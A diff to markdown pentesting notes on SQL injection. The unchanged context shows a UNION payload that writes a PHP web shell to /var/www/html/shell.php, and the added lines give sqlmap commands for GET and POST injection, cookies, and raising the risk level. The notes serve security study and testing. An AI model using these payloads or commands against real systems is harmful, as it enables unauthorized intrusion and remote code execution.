@@ -143,7 +143,7 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
 ```
 
-Writing data into files:
+- Writing data into files:
 
 ```shell
 # Writing tables data into file
@@ -171,3 +171,32 @@ One way to find it is to use load_file to read the server configuration
 ```shell
 ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
+
+## Using SQLMap For Exploitation
+
+```shell
+# Attacking GET request
+sqlmap -u "<target_domain>/vuln.php?id=1" --batch
+# Attacking POST request
+sqlmap '<target_domain>' --data 'uid=1&name=test'
+# Specify parameter to inject
+sqlmap '<target_domain>' --data 'uid=1&name=test' -p uid
+sqlmap '<target_domain>' --data 'uid=1*&name=test'
+# Changing request method
+sqlmap -u '<target_domain>' --data='id=1' --method PUT
+# Passing full HTTP request
+sqlmap -r req.txt
+# Custom headers
+sqlmap '<target_domain>' --data 'uid=1&name=test' --cookie='PHPSESSID=abc'
+sqlmap '<target_domain>' --data 'uid=1&name=test' -H='Cookie:PHPSESSID=abc'
+
+# Other options
+--parse-errors # Displays errors as part of the program run
+-t logs.txt # Stores results in file
+--proxy # To use a proxy
+--batch # Make decisions without user interaction
+--level (1-5, default 1) # Expectancy of success
+--risk (1-3, default 1) # Risk of causing problems
+```
+- Where usage of OR payloads is a must (e.g., in case of login pages), we may have to raise
+ the risk level ourselves because OR payloads are dangerous in a default run.
